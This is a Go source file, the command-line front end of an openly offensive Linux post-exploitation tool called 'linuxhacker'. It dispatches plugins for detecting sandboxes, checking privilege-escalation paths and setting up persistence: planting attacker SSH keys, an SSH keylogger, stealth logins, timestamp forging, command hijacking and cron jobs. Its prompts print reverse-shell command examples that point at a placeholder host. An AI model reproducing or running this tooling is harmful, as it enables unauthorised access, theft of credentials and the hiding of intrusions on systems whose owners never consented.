package main

import (
	"bufio"
	"flag"
	"fmt"
	plugins1 "linuxhacker/plugins/env_check"
	plugins3 "linuxhacker/plugins/maintance"
	plugins2 "linuxhacker/plugins/privilege_check"
	"os"
)

func main() {
	banner()

	helpFlag := flag.Bool("h", false, "Show help information")
	pluginFlag := flag.String("p", "", "Choose the plugin")
	checkFlag := flag.String("c", "", "Choose the choice for the corresponding plugin")

	flag.Parse()

	if *helpFlag || flag.NFlag() == 0 {
		fmt.Println("Usage: golang -p [plugin] -c [choice]")
		fmt.Println("Options:")
		fmt.Println("-p\tchoose the plugin")
		fmt.Println("-c\tchoose the choice for the corresponding plugin")
		return
	}

	var plugin string
	var choice string
	var input string
	var input2 string

	if *pluginFlag != "" {
		plugin = *pluginFlag
	} else {
		fmt.Println("please show the plugin")
	}
	if *pluginFlag != "" {
		choice = *checkFlag
	} else {
		fmt.Println("please show the choice")
	}
	fmt.Println("Plugin:", plugin)
	fmt.Println("Choice:", choice)
	fmt.Println()
	switch plugin {
	case "env_check", "1":
		switch choice {
		case "docker":
			plugins1.Docker_Check()
		case "vm":
			plugins1.VM_Check()
		default:
			fmt.Println("Bad input env_check choice(docker,vm)")
		}
	case "privilege_check", "2":
		switch choice {
		case "suid":
			fmt.Println("please input the dirctory to check(/usr/bin,/usr/sbin ...)")
			fmt.Scanln(&input)
			plugins2.SUID_Check(input)
		case "sudo":
			plugins2.SUDO_Check()
		case "cap":
			fmt.Println("please input the dirctory to check(/usr/bin,/usr/sbin ...)")
			fmt.Scanln(&input)
			plugins2.Capabilities_Check(input)
		case "kernel":
			plugins2.Kernel_Check()
		default:
			fmt.Println("Bad input privilege_check chocie(suid,sudo,cap,kernel)")
		}
	case "maintance", "3":
		switch choice {
		case "ssh_soft_link", "ssh1":
			fmt.Println("please input the port which is the other port of ssh")
			fmt.Scanln(&input)
			fmt.Println("please input the username to create to ssh login")
			fmt.Scanln(&input2)
			plugins3.Soft_Link(input, input2)
		case "ssh_public_key", "ssh2":
			fmt.Println("please copy the strings in the id_rsa.pub in your attack server and then input here")
			fmt.Scanln(&input)
			plugins3.Public_Key(input)
		case "ssh_key_logger", "ssh3":
			plugins3.Key_Logger()
		case "ssh_stealth_login", "ssh4":
			plugins3.Stealth_Login()
		case "cron":
			fmt.Println("please input the directory of crontab(/etc/crontab...)")
			fmt.Scanln(&input)
			fmt.Println("please input the crontab command(*/1 * * * * root bash -i >& /dev/tcp/xxx/xxx 0>&1)")
			fmt.Scanln(&input2)
			plugins3.Cron_Add(input, input2)
		case "file":
			fmt.Println("please input the existing file to get the atime and mtime")
			fmt.Scanln(&input)
			fmt.Println("please input the file to change the atime and mtime")
			fmt.Scanln(&input2)
			plugins3.File_Change(input, input2)
		case "command":
			fmt.Println("be careful if the command is overwritten!!!")
			fmt.Println("please input the command you want to hijack(/usr/bin/whoami ...)")
			fmt.Scanln(&input)
			fmt.Println("please input the directory you want to store the old command(/tmp ...)")
			fmt.Scanln(&input2)
			fmt.Println("please input the new bash command to replace the old command(/tmp/whoami ; bash -i /dev/tcp/xxx/xxx 0>&1 ...)")
			reader := bufio.NewReader(os.Stdin)
			input3, _ := reader.ReadString('\n')
			plugins3.Command_Replace(input, input2, input3)
		default:
			fmt.Println("Bad input maintance choice(ssh_soft_link/ssh1,ssh_public_key/ssh2,ssh_key_logger/ssh3,ssh_stealth_login/ssh4,cron,)")
		}
	default:
		fmt.Println("Bad input plugin(env_check/1,privilege_check/2,maintance/3)")
	}

}

func banner() {
	version := "1.0.0"
	fmt.Print(`
  _ _                  _                _             
 | (_)_ __  _   ___  _| |__   __ _  ___| | _____ _ __ 
 | | | '_ \| | | \ \/ / '_ \ / _` + "`" + ` |/ __| |/ / _ \ '__|
 | | | | | | |_| |>  <| | | | (_| | (__|   <  __/ |   
 |_|_|_| |_|\__,_/_/\_\_| |_|\__,_|\___|_|\_\___|_|
    `)
	fmt.Println("\t\t\t\tversion: " + version + "\n")
}
